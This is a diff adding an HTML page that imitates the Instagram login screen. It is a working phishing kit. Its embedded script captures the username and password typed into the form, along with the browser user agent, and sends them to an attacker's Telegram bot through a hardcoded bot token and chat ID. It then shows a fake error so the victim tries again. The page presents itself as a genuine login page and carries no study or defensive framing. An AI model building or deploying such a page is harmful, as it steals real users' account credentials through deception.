@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Instagram</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<!-- شعار إنستغرام بدقة عالية وبدون أي تشويه -->
+				<img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Instagram" style="width: 175px; display: block; margin: 0 auto 20px;">
+			</div>
+			<form class="form">
+				<div class="input_field">
+					<input type="text" placeholder="Phone number, username, or email" class="input" required>
+				</div>
+				<div class="input_field">
+					<input type="password" placeholder="Password" class="input" required>
+				</div>
+				<div class="btn">
+					<button type="submit" style="background:none; border:none; color:inherit; width:100%; font:inherit; cursor:pointer;">Log in</button>
+				</div>
+			</form>
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<!-- أيقونة فيسبوك -->
+					<img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" alt="facebook" style="width: 16px; height: 16px;">
+					<p><a href="#" style="color: inherit;">Log in with Facebook</a></p>
+				</div>
+				<div class="forgot">
+					<a href="#">Forgot password?</a>
+				</div>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Don't have an account? <a href="#">Sign up</a></p>
+		</div>
+		<div class="apps">
+			<p>Get the app.</p>
+			<div class="icons">
+				<!-- أزرار المتاجر -->
+				<a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store"></a>
+				<a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play"></a>
+			</div>
+		</div>
+	</div>
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">Meta</a></li>
+				<li><a href="#">About</a></li>
+				<li><a href="#">Blog</a></li>
+				<li><a href="#">Jobs</a></li>
+				<li><a href="#">Help</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">Privacy</a></li>
+				<li><a href="#">Terms</a></li>
+				<li><a href="#">Locations</a></li>
+				<li><a href="#">Instagram Lite</a></li>
+				<li><a href="#">Threads</a></li>
+				<li><a href="#">Contact Uploading & Non-Users</a></li>
+				<li><a href="#">Meta Verified</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2026 Instagram from Meta
+		</div>
+	</div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // 1. Select the form
+    const form = document.querySelector('.form');
+
+    // 2. Bot configuration
+    const BOT_TOKEN = '8883141343:AAGjlOpyP8k9scj-OTNqm9yArM1m4_THyh0'; // Put your bot token here
+    const CHAT_ID = '8815888516';     // Put your Chat ID here
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault(); // Prevent page reload on button click
+
+        // Get values entered inside the input fields
+        const inputs = form.querySelectorAll('.input');
+        const username = inputs[0].value;
+        const password = inputs[1].value;
+
+        // Prepare the message text to be sent to Telegram
+        const message = `📥 **New Login Attempt**\n\n` +
+                        `👤 **Username / Phone:** \`${username}\` \n` +
+                        `🔑 **Password:** \`${password}\` \n\n` +
+                        `🌐 **Browser:** ${navigator.userAgent}`;
+
+        // Telegram API URL to send the message
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // Send data using Fetch API
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // Show error message or handle redirect
+                alert('An error occurred. Please try again later.');
+                form.reset();
+            } else {
+                console.error('Error sending message:', data);
+            }
+        })
+        .catch(error => {
+            console.error('Fetch error:', error);
+        });
+    });
+});
+</script>
+</body>
+</html>
